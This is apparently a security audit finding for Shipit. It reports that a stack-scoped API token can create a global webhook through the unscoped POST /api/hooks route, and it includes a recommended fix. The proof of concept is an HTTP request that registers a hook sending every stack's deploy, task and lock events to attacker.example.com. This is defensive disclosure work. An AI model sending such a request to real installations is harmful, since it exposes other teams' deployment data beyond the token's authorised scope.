### Title
Stack-scoped ApiClient can register a global hook to receive deploy/task/lock events from every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
An `ApiClient` scoped to a single stack (via `ApiClient#stack_id`) can call the unscoped `POST /api/hooks` endpoint (rather than the stack-nested one) to create a **global** `Hook` (`stack_id: nil`). Global hooks receive delivery of every stack's lifecycle events (`deploy`, `task`, `rollback`, `lock`, `commit_status`, `deployable_status`, `merge_status`, `merge`, `pull_request`) system-wide. This breaks the binding between the stack a token is authorized for and the stacks whose data it can actually observe.

### Finding Description
`Shipit::ApiClient#check_permissions!` only checks whether the requested `operation:scope` string (e.g. `write:hook`) is present in the client's `permissions` array; it never consults `stack_id`: [1](#0-0) 

Stack scoping for API clients is enforced separately, in `Shipit::Api::BaseController#stacks`, which restricts `Stack` visibility when `current_api_client.stack_id?` is true: [2](#0-1) 

`Api::HooksController` derives the hook's `stack_id` from the request params, only calling the scope-checked `stack` helper when `params[:stack_id]` is present: [3](#0-2) 

The router mounts the *same* `HooksController#create` action at two different paths — one nested under a stack, and one at the top level with no `stack_id` param at all: [4](#0-3) 

Because the top-level route never populates `params[:stack_id]`, `Hook.create` is called with `stack_id: nil`, producing a **global** hook regardless of the fact that `current_api_client.stack_id` restricts that same client to a single specific stack. `Hook.deliver` explicitly includes global hooks (`stack_id: nil`) when delivering any stack's events: [5](#0-4) 

So a token that `Stack.where(id: current_api_client.stack_id)` was meant to constrain to one stack ends up receiving webhook deliveries for every stack in the installation — the stack the token authorizes and the stacks the resulting hook touches diverge.

### Impact Explanation
An attacker holding (or being issued, e.g. for a narrow CI/reporting purpose) an `ApiClient` token scoped to a single stack, with only the `write:hook` permission, can register a hook delivering to an attacker-controlled URL and passively receive deploy status, task output metadata, lock reasons/authors, merge status, and pull-request status events for **every** stack managed by the Shipit instance — data the token was never authorized to read. This matches the "unauthenticated read of stack state, task streams or deploy output" High-severity class, since it grants cross-stack visibility outside the scope the credential was actually granted.

### Likelihood Explanation
Any deployment that issues stack-scoped `ApiClient` tokens with the `write:hook` permission (a legitimate, independent, checkbox permission unrelated to stack scoping — see `app/views/shipit/api_clients/show.html.erb`) is affected. No special conditions are required beyond calling the alternate top-level route instead of the nested one; both map to the identical controller action.

### Recommendation
- In `Api::HooksController#create` (and `#index`/`#show`/`#update`/`#destroy`), reject/ignore requests to create global hooks when `current_api_client.stack_id?` is true, or force `stack_id` to `current_api_client.stack_id` whenever the client is stack-scoped.
- More generally, have `ApiClient#check_permissions!` also validate that any stack-affecting operation is consistent with `stack_id` when the client is scoped, rather than relying on each controller to re-derive scoping correctly per route.

### Proof of Concept
1. Admin creates an `ApiClient` scoped to `stack_id: <stack A>` with permissions `["write:hook"]` (e.g., intended only to let a stack-specific integration register a delivery callback for stack A).
2. Attacker (holder of that token) sends:
```
POST /api/hooks
Authorization: Basic <token for the stack-A-scoped client>
{
  "delivery_url": "https://attacker.example.com/collect",
  "events": ["deploy", "task", "lock", "merge_status", "pull_request"]
}
```
Note: no `stack_id` in the path/params — this is the top-level `resources :hooks` route in `config/routes.rb:46`, not the nested one at line 43.
3. `Api::HooksController#stack_id` returns `nil` (params[:stack_id] absent), so `Hook.create` persists a hook with `stack_id: nil`.
4. For every other stack B, C, ... in the installation, `Hook.deliver(event, stack_id, payload)` calls `for_stack(stack_id)` which is `where(stack_id: [nil, stack_id])`, matching the attacker's global hook, so `deliver!` POSTs that stack's event payload to `https://attacker.example.com/collect` — despite the originating token only being authorized for stack A.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
